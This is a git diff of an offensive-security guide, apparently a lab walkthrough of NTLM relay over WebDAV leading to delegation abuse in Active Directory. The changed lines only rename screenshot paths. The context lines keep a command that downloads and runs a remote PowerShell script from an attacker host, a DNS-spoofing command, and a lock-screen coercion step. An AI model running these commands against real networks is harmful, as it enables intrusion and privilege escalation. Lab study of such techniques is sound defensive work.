@@ -22,11 +22,11 @@ Install-WindowsFeature WebDAV-Redirector –Restart
 
 3\. Click on "Allow an app or feature through Windows Defender Firewall"
 
-![](<../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1).png>)
 
 4\. Select "File and Printer sharing" and click on "OK"
 
-![](<../../../.gitbook/assets/image (23) (1) (1).png>)
+![](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)
 
 ## Attacking
 
@@ -84,7 +84,7 @@ iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.3 -Realm amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (19) (1).png>)
+![](<../../../.gitbook/assets/image (19) (1) (1).png>)
 
 We now have all our prerequisites. Time to escalate our privileges.
 
@@ -107,7 +107,7 @@ change-lockscreen -webdav \\webdav@80\
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
-![](<../../../.gitbook/assets/image (64) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (64) (1) (1) (1) (1).png>)
 
 If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:
 
